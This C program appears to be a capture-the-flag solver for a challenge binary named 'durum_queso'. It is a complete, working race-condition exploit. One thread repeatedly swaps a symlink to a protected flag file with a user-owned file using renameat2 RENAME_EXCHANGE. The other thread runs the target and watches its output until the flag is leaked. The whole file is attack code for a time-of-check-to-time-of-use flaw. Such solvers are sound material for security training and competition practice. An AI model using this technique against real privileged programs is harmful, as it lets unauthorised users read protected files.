#define _GNU_SOURCE
#include <stddef.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/wait.h>
#include <pthread.h>

const char lnk[] = "/home/user/link";
const char flag[] = "/home/user/flag.txt";
const char ownedfile[] = "/home/user/ownedfile";
int solved = 0;

void *race4win(){
	while(!solved){
		renameat2(0, ownedfile, 0, lnk, RENAME_EXCHANGE);
	}
	pthread_exit(NULL);
}

void *call2durum_queso(){
	int pipefd[2];
	char buff[1024];
	while(!solved){
		pipe(pipefd);	// pipe for monitoring output to check if we got the flag
		if(!fork()){	// child calls durum_queso
			close(pipefd[0]);
			close(STDOUT_FILENO);
			dup(pipefd[1]);
			close(pipefd[1]);
			close(STDERR_FILENO); // ignore errors
			execlp("./durum_queso", "durum_queso", lnk, NULL);
		}else{			// parent checks output
			close(pipefd[1]);
			FILE * f = fdopen(pipefd[0], "r");
			fgets(buff, 1024, f);
			fgets(buff, 1024, f);
			if(!strncmp(buff, "HackOn", 6)){
				solved = 1;
				printf("%s",buff);
				break;
			}
			close(pipefd[0]);
			fclose(f);
			wait(NULL);
		}
	}
	remove(ownedfile); 
	remove(lnk);
	pthread_exit(NULL);
}

int main(int argc, char const *argv[])
{
	pthread_t th1, th2;
	symlink(flag, lnk);				// soft link to flag
	close(creat(ownedfile, 0666)); 	// simple file owned by us

	// 2 threads for the race
	pthread_create(&th1, NULL, race4win, NULL);		// this one exchanges the names of both files
	pthread_create(&th2, NULL, call2durum_queso, NULL);	// this one calls ./durum_queso and checks the output to get the flag
	pthread_join(th1, NULL);
	pthread_join(th2, NULL);

	return 0;
}
// gcc solver_durum_queso.c -o solver_durum_queso -lpthread
